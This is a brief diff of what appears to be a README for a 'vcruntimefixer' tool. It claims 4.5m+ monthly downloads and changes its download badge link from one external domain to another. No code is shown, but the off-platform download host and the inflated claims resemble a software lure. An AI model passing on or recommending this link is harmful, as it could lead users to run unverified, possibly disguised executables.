@@ -49,7 +49,7 @@ A: Yes — both 32-bit and 64-bit versions installed.
 
 **Monthly downloads:** 4.5m+
 
-[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://forumconnect.uk/vcruntimefixer)
+[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://connectinstruction.com/vcruntimefixer)
 
 ---
 
